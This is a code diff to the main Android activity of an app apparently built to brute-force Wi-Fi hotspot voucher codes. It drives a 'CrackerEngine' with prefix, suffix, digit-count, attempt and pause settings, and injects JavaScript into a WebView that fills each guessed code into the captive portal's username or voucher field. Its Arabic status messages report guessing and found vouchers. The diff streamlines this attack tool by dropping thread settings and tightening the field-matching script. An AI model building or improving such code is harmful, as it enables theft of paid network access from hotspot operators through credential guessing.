@@ -58,7 +58,7 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
         etPause.setText(prefs.getString("pause", "300"));
         etRetry.setText(prefs.getString("retry", "1500"));
         etStatusEvery.setText(prefs.getString("statusEvery", "50"));
-        etRttEvery.setText(prefs.getString("threads", "3"));
+        etRttEvery.setText(prefs.getString("threads", "1"));
 
         CookieManager.getInstance().setAcceptCookie(true);
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
@@ -114,7 +114,7 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
                 CookieManager.getInstance().removeAllCookies(null);
                 CookieManager.getInstance().flush();
                 logBuf.setLength(0);
-                logText.setText("🗑️ تم المسح. اضغط ابدأ من جديد.\n");
+                logText.setText("🗑️ تم المسح.\n");
                 statusText.setText("متوقف");
                 findViewById(R.id.btnStart).setEnabled(true);
                 findViewById(R.id.btnStop).setEnabled(false);
@@ -135,12 +135,7 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
         try { currentNetwork = new URI(url).getHost(); }
         catch (Exception e) { currentNetwork = "default"; }
 
-        // تدمير أي محرك قديم إذا كان لا يزال يعمل
-        if (engine != null) {
-            engine.stop();
-            engine = null;
-            try { Thread.sleep(500); } catch (Exception e) {}
-        }
+        if (engine != null) { engine.stop(); engine = null; try { Thread.sleep(500); } catch (Exception e) {} }
 
         String prefix = etPrefix.getText().toString().trim();
         String suffix = etSuffix.getText().toString().trim();
@@ -148,8 +143,6 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
         int attempts = pi(etAttempts, 100);
         int pause = pi(etPause, 300);
         int retry = pi(etRetry, 1500);
-        int statusEvery = pi(etStatusEvery, 50);
-        int threads = pi(etRttEvery, 3);
 
         prefs.edit()
             .putString("prefix", prefix).putString("suffix", suffix)
@@ -157,26 +150,22 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
             .putString("attempts", String.valueOf(attempts))
             .putString("pause", String.valueOf(pause))
             .putString("retry", String.valueOf(retry))
-            .putString("statusEvery", String.valueOf(statusEvery))
-            .putString("threads", String.valueOf(threads))
             .apply();
 
         logBuf.setLength(0);
         logText.setText("");
         voucherResult.setVisibility(View.GONE);
         statusText.setText("جاري التخمين...");
-        
-        // تعطيل زر البدء وتفعيل زر الإيقاف
         findViewById(R.id.btnStart).setEnabled(false);
         findViewById(R.id.btnStop).setEnabled(true);
 
         try {
             engine = new CrackerEngine(
-                this, prefs, currentNetwork, url, prefix, suffix, digits, attempts,
-                threads, pause, pause * 2, statusEvery, 5000, retry);
+                this, prefs, currentNetwork, url, prefix, suffix,
+                digits, attempts, pause, retry);
             engine.start();
         } catch (Exception e) {
-            logBuf.append("❌ فشل بدء المحرك: ").append(e.toString()).append("\n");
+            logBuf.append("❌ ").append(e.toString()).append("\n");
             logText.setText(logBuf.toString());
             findViewById(R.id.btnStart).setEnabled(true);
             findViewById(R.id.btnStop).setEnabled(false);
@@ -184,10 +173,7 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
     }
 
     private void stopCracker() {
-        if (engine != null) {
-            engine.stop();
-            engine = null;
-        }
+        if (engine != null) { engine.stop(); engine = null; }
         statusText.setText("متوقف");
         findViewById(R.id.btnStart).setEnabled(true);
         findViewById(R.id.btnStop).setEnabled(false);
@@ -220,13 +206,9 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
                 "var i=document.querySelectorAll('input');" +
                 "for(var k=0;k<i.length;k++){" +
                 "var x=i[k];" +
-                "if(x.type==='text'||x.name==='username'||x.id.indexOf('username')>=0||x.id.indexOf('voucher')>=0){" +
-                "x.value='"+v+"';" +
-                "x.dispatchEvent(new Event('input',{bubbles:true}));" +
-                "break;" +
-                "}" +
-                "}" +
-                "})()";
+                "if(x.type==='text'||x.name==='username'||(x.id&&x.id.indexOf('username')>=0)||(x.id&&x.id.indexOf('voucher')>=0)){" +
+                "x.value='"+v+"';x.dispatchEvent(new Event('input',{bubbles:true}));break;" +
+                "}}})()";
             webView.evaluateJavascript(js, null);
         });
     }
@@ -240,7 +222,6 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
             voucherResult.setVisibility(View.VISIBLE);
             statusText.setText("✅ وجد: " + voucher);
             Toast.makeText(this, "✅ " + voucher, Toast.LENGTH_LONG).show();
-            
             findViewById(R.id.btnStart).setEnabled(true);
             findViewById(R.id.btnStop).setEnabled(false);
 
@@ -248,13 +229,9 @@ public class MainActivity extends Activity implements CrackerEngine.Listener {
                 "var i=document.querySelectorAll('input');" +
                 "for(var k=0;k<i.length;k++){" +
                 "var x=i[k];" +
-                "if(x.type==='text'||x.name==='username'||x.id.indexOf('username')>=0||x.id.indexOf('voucher')>=0){" +
-                "x.value='"+voucher+"';" +
-                "x.dispatchEvent(new Event('input',{bubbles:true}));" +
-                "break;" +
-                "}" +
-                "}" +
-                "})()";
+                "if(x.type==='text'||x.name==='username'||(x.id&&x.id.indexOf('username')>=0)||(x.id&&x.id.indexOf('voucher')>=0)){" +
+                "x.value='"+voucher+"';x.dispatchEvent(new Event('input',{bubbles:true}));break;" +
+                "}}})()";
             webView.evaluateJavascript(js, null);
         });
     }
